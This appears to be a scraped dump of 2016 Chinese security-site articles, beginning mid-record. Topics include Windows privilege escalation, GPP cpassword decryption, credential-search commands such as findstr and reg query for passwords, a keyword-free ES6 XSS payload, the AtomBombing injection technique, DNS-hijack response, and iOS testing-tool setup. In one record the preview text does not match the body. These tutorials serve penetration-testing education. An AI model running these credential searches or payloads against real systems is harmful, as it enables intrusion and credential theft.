文件中的明文密码：credentials.[GuiUnattended]OEMSkipRegional=1OemSkipWelcome=1AdminPassword=s3cr3tp4ssw0rdTimeZone=20sysprep.xml 文件中的Base64加密后的密文：credentials. Please people Base64 is notencryption, I take more precautions to protect my coffee. The password here is ""SuperSecurePassword"".&lt;LocalAccounts&gt;    &lt;LocalAccount wcm:action=""add""&gt;        &lt;Password&gt;            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;            &lt;PlainText&gt;false&lt;/PlainText&gt;        &lt;/Password&gt;        &lt;Description&gt;Local Administrator&lt;/Description&gt;        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;        &lt;Group&gt;Administrators&lt;/Group&gt;        &lt;Name&gt;Administrator&lt;/Name&gt;    &lt;/LocalAccount&gt;&lt;/LocalAccounts&gt;Unattended.xml 中同样是Base64加密后的密文：&lt;AutoLogon&gt;    &lt;Password&gt;        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;        &lt;PlainText&gt;false&lt;/PlainText&gt;    &lt;/Password&gt;    &lt;Enabled&gt;true&lt;/Enabled&gt;    &lt;Username&gt;Administrator&lt;/Username&gt;&lt;/AutoLogon&gt;在我们的好基友Ben Campbell的推荐下，我将获取组策略首选项（Group Policy Preferences）保存的密码也作为快速攻陷目标机器的方式之一。GPP允许域管理员在域控制端远程向域内主机添加本地账户以方便管理。当你要攻击的计算机连接到了一个域，那么去寻找储存在SYSVOL中的Groups.xml文件是非常值得做的事。任何经过授权的用户都对该文件有读的权限。在这个xml文件中，密码是用AES加密的，但令人费解的是，在MSDN上，密码的密钥和加密方式都被公布了，这样我么就可以轻松的解密这个密码。除了Groups.xml，其他的策略选项文件也有可选的“cPassword”属性：例如以下这几个：Services\Services.xmlScheduledTasks\ScheduledTasks.xmlPrinters\Printers.xmlDrives\Drives.xmlDataSources\DataSources.xml这个漏洞可以手动的浏览SYSVOL文件夹，接下来我来做个示范：然而，我们都喜欢自动的方法，这样我们可以尽可能快的完成这个操作。这里主要有两种方式，取决于我们拥有的shell类型和权限的大小。（1）metasploit的一个模块（post/windows/gather/credentials/gpp）[戳我]（2）你可以使用PowerSploit[戳我]的Get-GPPPassword功能。PowerSploit是一个强大的powershell框架，作者是Matt Graeber。接下来的事情，我们要找一个奇怪的注册表设置“AlwaysInstallElevated”，如果这个设置被启用，它允许任何权限的用户暂时使用NT AUTHORITY\SYSTEM权限来安装*.msi文件。对我来说，你创建了一个低权限的用户（限制它们的操作系统的使用）但是给了它们使用SYSTEM权限来安装软件的能力是很奇怪的。想要进一步了解，请[戳我]为了能够使用这种方式，我们首先要执行以下语句：仅仅当存在键名：AlwaysInstallElevated且它的DWORD值是1才有效。C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevatedC:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated在这种情况下，我们可以获取一个SYSTEM权限的shell了。为了完成这部分，我们将在操作系统上做一些快速的搜索，并且希望我们可以打动老天爷。接下来的这条命令可以搜索system32下的所有名字包含以下几个关键字的文件，当然你可以手动指定关键字。C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*搜索某些特定的文件类型，这可能搜索到大量的结果：C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt相似的，接下来的两条命令都是用来搜索注册表的，keyword是password，你可以替换成任何你想要的。C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /sC:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s","2016-11-05 15:38:00","Web安全","Windows下的渗透测试之提权的基本套路（上）","http://nsoad.com/Article/web/20161105/706.html"
"5ccbfac64f2f0a0a7a69c0c2","众所周知，在XSS的实战对抗中，由于防守方经常会采用各种各样严格的过滤手段来过滤输入，所以我们使用的XSSPayload也会根据实际情况作出各种各样的调整，最常见的如避免括号","Kong","众所周知，在XSS的实战对抗中，由于防守方经常会采用各种各样严格的过滤手段来过滤输入，所以我们使用的XSSPayload也会根据实际情况作出各种各样的调整，最常见的如避免括号，避免引号，避免关键字等，以绕开过滤函数的检查，从而成功将代码注入到网页中运行。在传统的XSS Payload变形中，常用的无非有以下几种：1. 使用String.fromCharCode来避免关键字，如String.fromCharCode(97,108,101,114,116,40,49,41); 2. 使用URL编码来避免括号的识别，如location=’alert%281%29’; 3.使用正则对象的特点来避开引号，如alert(/1/);在多年的研究中基本上传统的变形手段都被研究的差不多了，很难找到创新的绕开手段。然而，近几年ECMAScript新版本的不断发展和推行，在带来了各种激动人心的语言特性的同时，也不可避免地带来了一些新的安全挑战。本文中所说的模板字符串，便是ECMAScript 6草案中的一种新特性。如MDN中所述，模板字符串（Template literals）允许嵌入表达式，并且支持多行字符串和字符串插补特性。基本语法为以下几种：  其中第一行为最基本用法，即使用反引号 (‘`’) 来代替普通字符串中的用双引号和单引号。第二行为多行字符串用法，即反引号中文本可以直接接受换行而不必使用\n换行符来强制换行。第三行则为模板字符串的最核心用法，即反引号中的${expression}占位符中expression可以为任意的JavaScript表达式，甚至为模板字符串。第四行则为使模板字符串变强大的最主要原因，如果一个模板字符串由表达式开头，则该字符串被称为带标签的模板字符串，该表达式通常是一个函数，它会在模板字符串处理后被调用，在输出最终结果前，你都可以在通过该函数对模板字符串来进行操作处理。在了解了以上知识后，我们不难发现，对于一个最简单的XSS Payload：alert(‘A’)来说，我们可以利用上述例子第一行的知识，使用“`”来代替引号，即成为alert(`A`)。之后，使用第四行的标签用法，我们可以直接去除括号，写成 alert `A`。最后，由于ECMAScript 6中支持直接用码点（code point）来表示Unicode字符，即直接写成”反斜杠+u+码点”。因此为避免alert关键字被识别，我们可以使用Unicode字符来替换alert几个字符，将payload写成\u0061\u006c\u0065\u0072\u0074`A`。此时最终的payload已经完全见不到alert关键字，括号，以及引号了。测试结果如下：  以上的方法经测试，在最新版本的Chrome，Firefox以及Edge浏览器中均可以执行。我们可以看出，ES6的新方法给我们带来便利的同时，也给XSS字符的安全监测带来了新的挑战。","2016-10-19 17:06:11","Web安全","ES6中的模板字符串和新XSS Payload","http://nsoad.com/Article/web/20161019/600.html"
"5ccbfac64f2f0a0a7a69c0c3","6年前一篇研究文章中提出的微软理念——“云端模糊测试(Fuzzing)将彻底改变安全测试”，以 Project Springfield 漏洞发现项目的登场亮相作为其实现形式","Kender","6年前一篇研究文章中提出的微软理念——“云端模糊测试(Fuzzing)将彻底改变安全测试”，以 Project Springfield 漏洞发现项目的登场亮相作为其实现形式。 Project Springfield 是基于Azure云的服务，依靠自动向代码提交不良输入来发现软件漏洞。微软提出的“云端模糊测试即服务”9月26号在亚特兰大Ignite大会上推出的 Project Springfield，为开发者在微软Azure云端虚拟机上进行持续性二进制文件测试的能力，有助发现和清除漏洞。微软研究团队将 Project Springfield 比作“百万美元漏洞检测机”，因为有些软件漏洞如果遗留时间过长，便会造成如此巨大的损失。当然，损失额度不一而足。2002年美国国家标准技术局(NIST)发布的一份研究估测，软件漏洞每年导致的美国经济损失在222亿到595亿美元之间(现在大概在790亿美元左右)。在软件发布前捕获漏洞，应该可以降低修复费用。微软称，Window 7 “百万美元”安全漏洞中的1/3，都是用其“白箱模糊测试”技术发现的，该技术内部称为SAGE(可扩展、自动化、指导性执行)。SAGE就是 Project Springfield 的其中一个组件。正如硅谷最近沸沸扬扬的其他公告，人工智能(AI)在这里面也掺了一脚。微软称其系统利用AI就“可能导致代码崩溃的条件”提出问题并做出更好决策。微软的白箱模糊测试算法象征性地从一个起始输入执行代码，并依据一路遇到的约束条件语句产生随后的输入数据。该技术与黑箱模糊测试完全不同，黑箱测试并不保证发送的畸形输入数据会通过所有目标路径。因而，黑箱模糊测试有可能漏掉关键测试条件。模糊测试适用于云计算，因为模糊测试软件可利用大量可用基础设施并行执行不同测试。但微软研究人员在2010年的研究论文中说道，这种计算灵活性甚至不如共享云基础设施得来的好处重要。将安全测试托管在云端，缩短简化了从每个应用收集信息、推送更新、驱动未来开发改进的过程。当然，也缩短了账单。","2016-10-02 14:28:47","安全管理","渗透测试的福音：既好用成本又低的云端模糊测试","http://nsoad.com/news/securityissue/20161002/477.html"
"5ccbfac64f2f0a0a7a69c0c4","从t7到t10 - 撸起袖子大干一场到现在这个阶段，我希望我们已经有了一个SYSTEM的shell，但是如果我们还没有，仍有一些其它的途径去获得SYSTEM权限。在这个最后的部分，我们将","Kong","Morphus实验室讲述了这样一个故事，在某周六的早上，你作为一家大公司的CSO（首席安全官），突然开始收到了雪片般飞来的消息。他们告诉你有游客在访问了你公司的网址后，浏览到了各种恶意内容。        这听起来像是公司网站出现了混乱，其实可能发生了更严重的的事情。当你深入研究后会发现，公司整个域名都被黑客劫持了，他们试图从你们客户那里窃取数据并且传播恶意代码。在本文中，我们会详细介绍针对上述场景的应急响应方案。另外，这一威胁对信息安全策略和安全布局的颠覆，我们可以用一些简单的方法进行缓解。DNS基础知识为了更好地理解到底发生了什么，我们需要了解一些DNS的基本概念。DNS即域名系统，是互联网能够正常运营的基础。我们每天使用的网站和其他网络服务的名字，都需要借助因特网协议转换为IP地址，DNS服务器就在其间起一个翻译的作用。DNS服务器以层级架构的方式工作，当解析请求传递给相应的DNS服务器时，它会负责解决问题。DNS服务器的根节点，可以比拟为任意网站域名最后看不见的一个点，它们分布在全世界不同的地方。这些根DNS服务器必须知道控制顶级域名DNS服务器（比如”.com”）的IP地址。同样，“.com”DNS服务器也需要知道控制你公司域名的DNS服务器（比如“yourdomain.com”）的IP地址。举个例子，有DNS请求需要解析“www.yourdomain.com”，在请求包到达了根DNS服务器“.”之后，反过来又会下放到“.com”服务器，接着再到你公司的DNS服务器，最后它会解析“www”域名，然后返回正确的地址给你。这些顶级域名（比如”.com”）由域名注册商把控，这些域名注册商也被称作NIC（网络信息中心）。它们会管理自己负责的注册域名，同时专门配置DNS服务器的IP地址，来负责解析如“yourdomain.com”等域名。域名劫持无论你在哪家域名注册商注册或者管理一个域名，必须先在他们那里创建一个账户。这个账户可以把域名注册商的DNS服务器IP地址，指向你的网站或者email服务器的IP地址。这样一来，域名注册商网站的账户信息会显得非常重要。一旦有不怀好意的人获取到这些信息，就能任意操作你的域名配置以及你DNS服务器的IP地址。简而言之，他们可以将你们公司的域名和邮件劫持到他那儿。我们现在回过来看看，故事中到底发生了什么：黑客盗窃了该公司在域名注册网站的身份凭证，登进去改变了主/次DNS服务器配置，将其指向了黑客自己的地址。之后，该公司的客户访问的都是黑客伪造的网站，然后下载了黑客准备的恶意内容。我们可以猜测，罪犯的目的很可能是为了传播恶意软件。事件响应与大多数网络事件一样，你只需要加载备份和配置就能恢复你的基础设施。在这个事件当中，所有的服务器其实并没有受到损害。在这些情况下，你有两件事要做：第一，找回域名注册网站上的登陆凭证。第二，提醒你的客户网站已经被黑，千万不能再在上面下载任何内容。注意，你这个时候千万不能使用你公司的email去发送消息，因为黑客很可能已经控制了你们的email服务，甚至正在窃听你们公司所有的通信内容。我们这里建议，你可以通过公司的社交网络账户或者其他渠道去发送这些通知。我们认为，黑客之所以选择在周末进行袭击，那是因为这时候是比较难恢复网络环境的。这次事件发生在周六早上11点，直到下午5点左右该公司才将DNS配置为正确的服务器。但是事情到了这里还没完，由于黑客的恶意改动，客户在接下来几个小时内仍然访问到的是伪造的网站，这一直持续到了因特网上DNS缓存进行了更新才结束。本来黑客为公司域名设置了24小时的TTL值，这意味着DNS服务器会在接下来的24小时内用黑客的IP来解析公司域名。公司想要加快恢复的唯一途径，是联系国内负责主DNS服务器的网络运营商，然后请求他们刷新DNS配置。当做好这一切后，情况终于开始恢复。网站凭证是如何失窃的在这期间，公司应急响应团队中有一部分人员负责恢复网络环境，另一部分人员开始分析凭证失窃的原因。在向负责此事的DNS管理员问询后，我们收集到一些值得注意的信息：他在域名注册商那里，绑定了一个Gmail账户，这可以用来进行密码找回。在这次事件发生之前，他的手机至少在4小时内出现无服务的情况，而重置Gmail密码的短信正需要这台手机。经过公司调查人员的努力，发现Gmail的密码确实在那段时间被人通过手机进行了更改。另外，根据收到的证据表明，这只可能是因为手机被克隆了。目前，这一假设是非常合理的，我们知道黑客可以通过SDR（软件无线电）向GSM基础设施发起攻击，截获特定号码的网络消息和短信消息。攻击者的目标这一事件中出现了很多的受害者，首先是被劫持域名的公司本身，其次还有访问黑客伪造的网站然后下载了恶意软件的用户们。很明显，这种情况下的域名劫持只是为那些没有太多警惕性的人准备的。黑客通过那些信任这家公司的人，去散播恶意软件，最终成功让他们感染。根据初步分析，这次事件的恶意软件样本是一个银行木马（Banload），它专门用于窃取巴西银行用户的凭证。漏洞和建议黑客会利用不同的漏洞和攻击策略来达到他们的目的，下面我们会讨论一些预防和对抗措施，来减轻类似攻击带来的风险。双因子身份认证咱们现在在域名注册商那里启用双因子验证是非常有必要的，这意味着你必须要提供至少两种方法才能证明你的身份，比如密码、硬件/软件令牌，甚至你自己的指纹。在这次事件的分析中，即使黑客可以重置于域名注册商绑定的Gmail账户，他们也无法获得软件令牌。这次的事件告诉我们，千万不要用短信作为第二重的身份验证，因为手机被盗或者被克隆后，黑客就可以通过短信服务去获取你的身份凭证。分析与域名注册商绑定的email账户分析这个email账户是非常重要的，通常它们可以用于重置网站的密码，所以经常会成为许多钓鱼者热衷的目标。如果你偏爱使用email账户进行身份验证的话，建议启用双因子身份认证，这样更不容易被黑。建立事件响应计划你需要有一个针对这类事件的详尽的应对措施，咱们总会有用到的时候。另外，大家需要注意的是，计划中需要包括：域名注册商的紧急联系方式（联系人和电话号码）提醒客户的另一个安全途径（非email）同域名注册商建立常规应急通信流程（如模拟练习）","2016-11-07 14:41:13","Web安全","域名劫持事件发生后的应急响应策略","http://nsoad.com/Article/web/20161107/712.html"
"5ccbfad04f2f0a0a7a69c0c5","这是Mwrlabs 继drozer之后，又出一款ios测试神器needle。使用要求一部越狱后的iphone手机，暂时只支持到了ios8和ios9越狱后的iphone需要安装（缺一不可）：1、Cydia2、Open","Kong","这是Mwrlabs 继drozer之后，又出一款ios测试神器needle。使用要求一部越狱后的iphone手机，暂时只支持到了ios8和ios9越狱后的iphone需要安装（缺一不可）：1、Cydia2、OpenSSH3、Apt 0.7 Strict系统依赖环境搭建# Core dependencies    brew install python    brew install libxml2    xcode-select --install# Pythonpackages    sudo -H pip install --upgrade --user readline    sudo -H pip install --upgrade --user paramiko    sudo -H pip install --upgrade --user sshtunnel    sudo -H pip install --upgrade --user frida# sshpass    brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb# mitmproxy    wget https://github.com/mitmproxy/mitmproxy/releases/download/v0.17.1/mitmproxy-0.17.1-osx.tar.gz    tar -xvzf mitmproxy-0.17.1-osx.tar.gz    sudo cp mitmproxy-0.17.1-osx/mitm* /usr/local/bin/#libimobiledevice4    brew install -v --fresh automake autoconf libtool wgetlibimobiledevice    brew install -v --HEAD --fresh --build-from-source ideviceinstaller神器下载：gitclone https://github.com/mwrlabs/needle.gitneedle使用进入到needle 目录执行 python needle.py 即可启动1.通过show options 可以查看正常运行时所需设置的属性。bogon:needle an$ python needle.py      __  _ _______ _______ ______     _______      | \ | |______ |______ |   \ |   |______      | \_| |______ |______ |_____/ |_____ |______         Needle v0.0.4 [mwr.to/needle] [MWR InfoSecurity (@MWRLabs) - Marco Lancini (@LanciniMarco)][needle] &gt; show options Name      Current Value       Required Description ------------- -------------       -------- ----------- APP                   no    Bundle ID of the target application (e.g., com.example.app). Leave empty to launch wizard DEBUG     False           yes    Enable debugging output IP       127.0.0.1         yes    IP address of the testing device (set to localhost to use USB) OUTPUT_FOLDER /Users/an/.needle/output yes    Full path of the output folder, where to store the output of the modules PASSWORD    alpine          yes    SSH Password of the testing device PORT      2222           yes    Port of the SSH agent on the testing device (needs to be != 22 to use USB) PUB_KEY_AUTH  True           yes    Use public key auth to authenticate to the device. Key must be present in the ssh-agent if a passphrase is used SETUP_DEVICE  False           yes    Set to true to enable auto-configuration of the device (installation of all the tools needed) USERNAME    root           yes    SSH Username of the testing device VERBOSE    True           yes    Enable verbose output[needle] &gt;2.可以通过输入把每条命令输入，也可写成配置文件在启动时运行。(1)手动输入[needle]&gt; set DEBUG FalseDEBUG=&gt; False[needle]&gt; set SETUP_DEVICE TrueSETUP_DEVICE=&gt; True……(2)通过配置文件在启动needle时读取设置bogon:needle$ python needle.py -r config.txt      __  _ _______ _______ ______     _______      | \ | |______ |______ |   \ |   |______      | \_| |______ |______ |_____/ |_____ |______         Needle v0.0.4 [mwr.to/needle] [MWR InfoSecurity (@MWRLabs) - Marco Lancini (@LanciniMarco)][*] Loading commands from resource file[needle] &gt; set DEBUG FalseDEBUG =&gt; False[needle] &gt; set VERBOSE TrueVERBOSE =&gt; True[needle] &gt; set PUB_KEY_AUTH TruePUB_KEY_AUTH =&gt; True[needle] &gt; set SETUP_DEVICE TrueSETUP_DEVICE =&gt; True[needle] &gt; set IP 127.0.0.1IP =&gt; 127.0.0.1[needle] &gt; set PORT 2222PORT =&gt; 2222[needle] &gt; use binary/metadata[needle][metadata] &gt; EOF[+] Resource file successfully loaded[needle][metadata] &gt;注意:第一次运行needle 务必将SETUP_DEVICE设置为True，这样就会自动为iphone安装依赖工具。以后可将SETUP_DEVICE设置为False。到这一步即可正常使用。[needle][metadata] &gt; run[*] Checking connection with device...[V] Connection not present, creating a new instance[V] Setting up USB port forwarding on port 2222[V] Setting up SSH connection...[+] Connected to: 127.0.0.1[V] Creating temp folder: /var/root/needle/[*] Configuring device...[?] Error occurred during installation of tools: E: Couldn't find package ondeviceconsole[?] Trying to continue anyway...[*] Target app not selected. Launching wizard...[V] Refreshing list of installed apps...[+] Apps found:        0 - com.az.azdribbble        1 - com.e4bf058461-1-42        2 - com.ss.iphone.article.NewsPlease select a number: 0[+] Target app: com.az.azdribbble[*] Retrieving app's metadata...[+] Name        : PGDribbble.app[+] Binary Name     : PGDribbble[+] Bundle ID      : com.az.azdribbble[+] UUID        : 081C6042-6C0C-4D92-806D-D578EA20203B[+] App Version     : 10009 (1.0.0)[+] Data Directory   : /private/var/mobile/Containers/Data/Application/5D25604C-8707-4036-ACAC-0A0F0732F808[+] Bundle Directory  : /private/var/mobile/Containers/Bundle/Application/081C6042-6C0C-4D92-806D-D578EA20203B[+] Binary Directory  : /private/var/mobile/Containers/Bundle/Application/081C6042-6C0C-4D92-806D-D578EA20203B/PGDribbble.app[+] Binary Path     : /private/var/mobile/Containers/Bundle/Application/081C6042-6C0C-4D92-806D-D578EA20203B/PGDribbble.app/PGDribbble[+] Architectures    : arm64[+] Platform Version  : 9.3[+] SDK Version     : iphoneos9.3[+] Minimum OS     : 9.0[+] Entitlements[+]          application-identifier         : 8SCA46H5FT.com.az.azdribbble[+]          com.apple.developer.team-identifier   : 8SCA46H5FT[+]          keychain-access-groups         : ['8SCA46H5FT.com.az.azdribbble'][+]          aps-environment             : production[*] URL Handlers not found[+] Apple Transport Security Settings[+]          NSAllowsArbitraryLoads         : 1[*] No Application Extensions found[needle][metadata] &gt;具体使用命令就不在此列举，毕竟刚出没多久还有许多坑需要填。","2016-11-02 15:58:53","安全工具","ios测试神器needle使用环境搭建","http://nsoad.com/Security-tools/20161102/tools-678.html"
"5ccbfad04f2f0a0a7a69c0c6","= 最近，我们发现了一种称为AtomBombin的新的代码注入技术，它利用了Windows的异步过程调用（简称APC）机制。目前，这种技术还不能够被防入侵的安全工具检测到。代码注入作","Kong","= 最近，我们发现了一种称为AtomBombin的新的代码注入技术，它利用了Windows的异步过程调用（简称APC）机制。目前，这种技术还不能够被防入侵的安全工具检测到。代码注入作为一种强大的武器已经存在于黑客武器库中很多年了。有关代码注入的背景及其在APT攻击中的各种用法，请查看：http://blog.ensilo.com/atombombing-a-code-injection-that-bypasses-current-security-solutions概述我们开始窥探一下，看看攻击者如何努力找到一种安全厂商不知道的新方法，以实现绕过大多数的安全产品。 它还需要能够在不同的进程上工作，而不是只是能适应特定的进程。在这里，我想向你介绍的就是AtomBombing - 一种全新的Windows代码注入技术。AtomBombing需要以下三步来实现：1.任意地址写任意值（Write-What-Where） - 能够将任意数据写入目标进程的地址空间中的任意位置。2.执行 - 劫持目标进程的线程以执行在步骤1中写入的代码。3.恢复 - 清理并且恢复执行在步骤2中被劫持的线程。 AtomBombing 步骤1: 任意地址写任意值（Write-What-Where）我是在偶然之间发现这几个非常有趣的API函数的：GlobalAddAtom - 向全局原子表中添加一个字符串，并返回一个唯一的值（一个原子）来标识字符串。GlobalGetAtomName - 通过指定一个全局原子来检索它对应的字符串副本。通过调用GlobalAddAtom，可以在全局原子表中存储一个空终止的缓冲区。并且此表可以被系统上的每个进程访问。然后可以通过调用GlobalGetAtomName来检索缓冲区。 GlobalGetAtomName函数接收一个指向输出缓冲区的指针，因此调用者可以选择将空终止缓冲区存储在哪里。理论上，我可以通过调用GlobalAddAtom向全局原子表添加一个包含shellcode的缓冲区，然后以某种方式使目标进程调用GlobalGetAtomName，那么就可以将代码从我的进程复制到目标进程，而不需要调用WriteProcessMemory。从我的当前进程中调用GlobalAddAtom是非常简单的，但是如何使目标进程调用GlobalGetAtomName呢？可以使用线程异步过程调用（APC）来解决：QueueUserApc()函数： 向指定线程的APC队列添加用户模式APC对象。函数原型如下：DWORD WINAPI QueueUserAPC(_In_ PAPCFUNC  pfnAPC, _In_ HANDLE    hThread, _In_ ULONG_PTR dwData);QueueUserApc函数的第一个参数是指向APC功能函数(APCProc)的指针，这个函数的函数原型如下：VOID CALLBACK APCProc(  _In_ ULONG_PTR dwParam);GlobalGetAtomName的原型是：UINT WINAPI GlobalGetAtomName(  _In_  ATOM   nAtom,  _Out_ LPTSTR lpBuffer,  _In_  int    nSize);由于GlobalGetAtomName需要3个参数（而APCProc的定义只有1个参数），因此我们不能使用QueueUserApc来直接调用目标进程中的GlobalGetAtomName。让我们来看看QueueUserApc的内部：正如图示的一样，QueueUserApc内部使用未公开的NtQueueApcThread系统调用，来将APC添加到目标线程的APC队列。有趣的是，NtQueueApcThread接受的APC函数的指针并不是调用者传递给QueueUserApc的原始APCProc函数指针。 相反，实际传递的函数指针是ntdll!RtlDispatchAPC，并且传递给QueueUserApc的原始APCProc函数是作为参数传递给ntdll！RtlDispatchAPC的。再让我们来看看ntdll!RtlDispatchAPC：它首先检查第三个参数是否有效，这意味着在分派APC之前需要激活ActivationContext。如果需要激活ActivationContext：函数ntdll!RtlDispatchAPC函数的执行流程如下：1.传递的ActivationContext（当前在ESI中）将通过调用RtlActivateActivationContextUnsafeFast函数来激活。2.将原来APCProc函数的参数（即传递给QueueUserApc的第三个参数）压到栈中。因为我们要调用原来的APCProc函数。3.在分发APC之前，调用CFG（__guard_check_icall_fptr）以确保APC的目标是CFG有效的函数。（译注：CFG指的是控制流保护）4.调用原始的APCProc，APC被成功调度。一旦APCProc返回，ActivationContext会被激活：另一方面，如果不需要激活ActivationContext：那么代码会跳过所有ActivationContext相关的东西，并在调用CFG后立即调度APC。这意味着什么？当调用QueueUserApc时，我们被迫传递一个只有一个参数的APCProc。但是，在内部QueueUserApc使用NtQueueApcThread来调用ntdll!RtlDispatchAPC，而它使用3个参数。我们之前的目标是什么？是为了调用GlobalGetAtomName。那它需要多少个参数呢？3个！我们能够满足要求吗？ 能！ 怎么样实现呢？ 通过NtQueueApcThread！请参阅AtomBombing的GitHub中的main_ApcWriteProcessMemory。AtomBombing 步骤2：执行显然，我从来没指望能在我的目标进程中找到RWX(译注:指可读可写可执行，因为目前的保护机制使得一般可读写的内存不可执行。而可执行的内存不可写。)的代码段。我需要一种能在目标进程中持续分配RWX内存的方法，而且不需要在被注入进程的环境中调用VirtualAllocEx函数。遗憾的是，我找不到任何这样的函数，可以使我通过APC调用来分配可执行内存或者更改现有内存的保护标志。我们到目前为止拥有了什么？一个任意地址写+想得到可执行内存的强烈欲望。我想了很久，发现很难克服这个障碍，但是马上我突然想到了。当DEP被发明时，它的创造者认为，“就像这样，数据不再是可执行的了，因此再也没有人能够利用漏洞了”。然而不幸的是，情况并非如此; 一种新的技术被开发出来，来专门实现绕过DEP：这就是ROP - 返回导向编程。那么我们该如何使用ROP来巩固我们的优势，从而在目标进程中执行我们的shellcode呢？我们可以将我们的代码复制到目标进程中的RW代码段（使用步骤1中的方法）。然后通过精心制作的ROP链来分配RWX内存，再把代码从RW代码区复制到新分配的RWX内存块中，最后跳转到RWX内存中执行它。找到RW代码段并不难，对于这个概念证明，我决定使用在kernelbase的数据部分之后的未使用的空间。请参阅AtomBombing的GitHub中的main_GetCodeCaveAddress。ROP链:我们的ROP链需要实现三件事：1.分配RWX内存2.将shellcode从RW代码段复制到新分配的RWX内存中3.执行刚分配的RWX内存中的代码ROP链第一步：分配RWX内存我们想分配一些RWX内存。第一个想到的函数是VirtualAlloc - 一个非常有用的功能，可以用来分配RWX内存。唯一的问题是函数返回的内存指针是储存在EAX寄存器中的，这将使我们的ROP链复杂化，因为必须找到一种方法将存储在EAX中的值传递给链中的下一个函数。通过一个非常简单的技巧可以简化我们的ROP链，并且使它更高级。我们可以使用ZwAllocateVirtualMemor来代替VirtualAlloc，这个函数使用新分配的RWX内存地址作为输出参数。这样我们就可以设置我们的堆栈，使ZwAllocateVirtualMemory返回的新分配的内存地址进一步沿堆栈传递到链中的下一个函数中（见表1）。ROP链第二步：拷贝Shellcode我们需要的下一个函数的功能是将一个缓冲区中的内存复制到另一个缓冲区中。这里有两个选项：memcpy和RtlMoveMemory。当创建这种ROP链时，可能最初是倾向于使用RtlMoveMemory的，因为它使用stdcall调用约定，这意味着它会自己清理堆栈。但是这里是一个特殊情况，我们需要将内存复制到一个地址上（由ZwAllocateVirtualMemory压在栈上），之后需要调用这个地址。如果我们使用RtlMoveMemory，它将在返回时立即弹出RWX shellcode的地址。 另一方面，如果我们使用memcpy，栈上的第一项将是memcpy的返回地址，后面是memcpy的目标参数（即RWX shellcode）。ROP链第三步：执行新分配的RWX内存我们已经分配了RWX内存并将我们的shellcode复制了进去。我们即将从memcpy返回，但是栈上的RWX shellcode的地址距离返回地址还有4个字节的差距。因此，我们所要做的就是在ROP链中添加一个非常简单的gadgets。这个gadgets简单执行个“ret”指令就可以。memcpy会返回到这个gadgets上，它会“重新”进入我们的RWX shellcode。将EIP设置为指向ZwAllocateVirtualMemory，并将ESP指向此ROP链：表1:完整的ROP链请参阅AtomBombing的GitHub中的main_BuildROPChain。调用ROP链：还有一个事情需要解决，就是APC只允许我们传递3个参数。但是显然我需要在堆栈上存储11个参数。所以我们最好的选择就是将栈转移到一块RW内存，并在这块内存中存放ROP链。（例如，kernelbase中的RW代码洞）。那我们怎么翻转栈呢？NTSYSAPI NTSTATUS NTAPI NtSetContextThread(_In_       HANDLE  hThread,  _In_ const CONTEXT *lpContext);这个系统调用将hThread句柄指定的线程的Context（寄存器值）设置为包含在lpContext中的值。如果我们可以让目标进程调用这个系统调用，使lpContext中的ESP指向我们的ROP链、EIP指向ZwAllocateVirtualMemory，那么我们的ROP链就可以被执行，而且ROP链会让我们的shellcode也得到执行。如何让目标进程来进行此调用？APC到目前为止很好用，但是这个系统调用需要的是2个参数而不是3个，所以当它返回时堆栈将被破坏，并且后果将是未知的。也就是说，如果我们传递一个当前线程的句柄作为hThread，那么函数永远不会返回。原因是一旦执行到内核，线程的Context将被设置为由lpContext指定的Context，并且将不会有NtSetContextThread曾被调用的踪迹。 如果一切都按我们的希望工作，我们将成功地劫持一个线程，并让它执行我们的恶意shellcode。请参阅AtomBombing的GitHub中的main_ApcSetThreadContext。AtomBombing 步骤3：恢复但是我们确实还有一个问题。我们劫持的线程在我们劫持它之前是正在运行的。如果我们不恢复它的执行的话，就很有可能会对进程造成未知的影响。我们如何恢复执行？我想提醒你，我们现在是在一个APC的上下文中。当APC功能完成时，执行的某些东西会被安全的恢复。 让我们看看从目标进程的角度来分配APC。看起来负责调度APCs的函数（在本例中为WaitForSingleObjectEx）像是ntdll！KiUserApcDispatcher。我们可以在这个代码块中看到3个“call”指令。第一个call是CFG，下一个call是ECX（这是APC函数的地址），最后会调用未公开的函数ZwContinue。ZwContinue希望接收一个指向CONTEXT结构的指针以恢复执行。实际上，内核将检查线程的APC队列中是否还有更多的APC，并在最终恢复线程的原始执行之前进行分发，但是我们可以忽略它。传递给ZwContinue的CONTEXT结构在调用APC函数（存储在ECX中）之前存储在EDI中。我们可以在我们的shellcode的开头保存EDI的值，并在shellcode结尾处使用EDI的原始值调用ZwContinue，从而安全地恢复执行。请参阅AtomBombing的GitHub中的AtomBombingShellcode我们必须确保EDI的值在调用NtSetContextThread时不会被覆盖，因为它修改了寄存器的值。这可以通过将ContextFlags（传递给NtSetContextThread的CONTEXT结构的成员）设置为CONTEXT_CONTROL来实现，这意味着只有EBP，EIP，SEGCS，EFLAGS，ESP和SEGSS会受到影响。 只要（CONTEXT.ContextFlags | CONTEXT_INTEGER == 0），一切就没有问题。如上图所示，我们成功注入代码到chrome.exe中。我们注入的代码生成了经典的calc.exe以证明它是可用的。让我们尝试将代码注入vlc.exe完整的实现可以在GitHub上找到。已经针对Windows 10 x64 Build 1511（WOW）和Windows 10 x86 Build 10240进行过测试。使用release版进行编译。让我们对mspaint.exe进行相同的操作：糟糕，它crash掉了。最后一步我们还可以进一步做点什么？其实我已经做完了，但是在这一点上我宁愿把这作为一个留给读者的练习。留一个简单的提示，我建议您查看我以前的博客文章https://breakingmalware.com/documentation/documenting-undocumented-adding-control-flow-guard-exceptions我相信你也会找到一些我没找到的创造性想法的，我很愿意能进行关于这个的讨论。你可以使用下面的评论或直接@我(@tal_liberman)。我也会在一周内通过Twitter发布一些新闻。无论如何，我将在下周发布我的解决方案。附录:查找alertable线程我们还没有提到的一件事是QueueUserApc只适用于处于alertable状态的线程。 